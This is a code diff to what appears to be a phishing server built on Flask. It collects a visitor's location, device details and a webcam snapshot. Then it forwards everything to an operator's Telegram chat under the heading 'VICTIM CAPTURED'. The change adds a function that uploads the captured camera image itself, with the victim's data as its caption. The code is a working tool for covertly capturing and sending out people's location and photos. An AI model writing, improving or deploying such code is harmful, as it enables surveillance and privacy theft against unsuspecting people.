@@ -16,13 +16,12 @@ logger = logging.getLogger(__name__)
 # --- CONFIGURATION ---
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "YOUR_TELEGRAM_USER_ID")
-# Render injects RENDER_URL (e.g., https://my-phish.onrender.com)
 RENDER_BASE_URL = os.getenv("RENDER_URL", "http://localhost:5000")
 
 app = Flask(__name__)
 
 def send_telegram(text, chat_id=ADMIN_CHAT_ID):
-    """Helper to send message to your Telegram"""
+    """Helper to send text message to your Telegram"""
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         logger.warning("BOT_TOKEN not set. Skipping Telegram send.")
         logger.info(f"Message would have been: {text}")
@@ -41,6 +40,29 @@ def send_telegram(text, chat_id=ADMIN_CHAT_ID):
             logger.error(f"Telegram API error: {response.text}")
     except Exception as e:
         logger.error(f"Telegram send error: {e}")
+
+def send_telegram_photo(image_path, caption="", chat_id=ADMIN_CHAT_ID):
+    """Helper to send an image file to your Telegram"""
+    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not os.path.exists(image_path):
+        logger.warning(f"Photo send skipped. Token set: {BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE'}, File exists: {os.path.exists(image_path)}")
+        return
+
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    
+    # Read the file in binary mode
+    with open(image_path, 'rb') as photo:
+        files = {'photo': photo}
+        data = {
+            "chat_id": chat_id,
+            "caption": caption,
+            "parse_mode": "HTML"
+        }
+        try:
+            response = requests.post(url, files=files, data=data, timeout=30)
+            if response.status_code != 200:
+                logger.error(f"Telegram Photo API error: {response.text}")
+        except Exception as e:
+            logger.error(f"Telegram photo send error: {e}")
 
 # --- TELEGRAM BOT HANDLERS ---
 def bot_listener():
@@ -147,13 +169,14 @@ def capture_data():
             with open(filename, 'wb') as f:
                 f.write(base64.b64decode(base64_data))
             snapshot_path = filename
+            logger.info(f"Snapshot saved to {filename}")
         except Exception as e:
             logger.error(f"Error saving snapshot: {e}")
 
     safe_ua = re.sub(r'<[^>]+>', '', str(data.get('userAgent', 'N/A')))[:60]
 
-    report = f"""
-🚨 <b>VICTIM CAPTURED</b> 🚨
+    # Prepare Caption for the Photo
+    caption = f"""🚨 <b>VICTIM CAPTURED</b> 🚨
 🆔 <b>ID:</b> <code>{unique_id}</code>
 
 📍 <b>LOCATION</b>
@@ -168,14 +191,25 @@ def capture_data():
 💻 UA: {safe_ua}...
 🖥️ Screen: {data.get('screenRes', 'N/A')}
 
-📸 <b>CAMERA</b>
-{'✅ Snapshot saved to: ' + snapshot_path if snapshot_path else '❌ No camera data'}
+🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}"""
 
-🕒 <b>TIME</b>
-{datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+    # Send the photo if we have one
+    if snapshot_path:
+        send_telegram_photo(snapshot_path, caption=caption)
+    else:
+        # Fallback to text if no camera data
+        fallback_report = f"""
+🚨 <b>VICTIM CAPTURED (NO CAMERA)</b> 🚨
+{caption}
+📸 <b>CAMERA</b>
+❌ No camera data provided.
 """
+        send_telegram(fallback_report)
+
+    # Cleanup: Optional. Remove old files to save disk space on Render
+    # Render filesystem is ephemeral, but let's keep it clean just in case
+    # (Render resets on deploy anyway, so this is optional)
     
-    send_telegram(report)
     return {"status": "success", "msg": "Verification complete."}
 
 @app.route('/health')
